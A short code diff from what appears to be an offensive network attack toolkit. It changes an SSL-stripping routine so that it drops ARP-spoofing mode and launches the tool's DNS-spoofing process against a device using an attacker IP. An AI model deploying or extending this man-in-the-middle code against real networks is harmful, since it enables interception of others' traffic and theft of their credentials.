@@ -222,20 +222,15 @@ void ATK::SSL::AllOutSslStrippingStrategy::onPacketArrives(
 void ATK::SSL::AllOutSslStrippingStrategy::execute() {
     std::string cmd;
     if (mitmStrategy_ == ATK::SSL::MitmStrategy::ARP) {
-        std::ostringstream command;
-        command
-            << "\"" << ATK::Common::getProcessName() << "\" --arp"
-            << " \"" << device_->getName() << "\""
-            << " \"\""; // Supply empty attackerMac to automatically derive it
-        cmd = command.str();
-    } else { // Perform DNS spoofing in the background
-        std::ostringstream command;
-        command << "\"" << ATK::Common::getProcessName() << "\" --dns"
-                << " \"" << device_->getName() << "\""
-                << " \"" << attackerIp_.toString() << "\"";
-        cmd = command.str();
+        LOG_ERROR("SSL ARP does not support all-out mode! Try using DNS instead.");
+        throw std::runtime_error("Unsupported exception");
     }
-    // Start ARP/DNS spoofing on different thread
+    std::ostringstream command;
+    command << "\"" << ATK::Common::getProcessName() << "\" --dns"
+            << " \"" << device_->getName() << "\""
+            << " \"" << attackerIp_.toString() << "\"";
+    cmd = command.str();
+    // Start DNS spoofing on different thread
 #ifdef _WIN32
     HANDLE hJob = CreateJobObject(nullptr, nullptr);
 
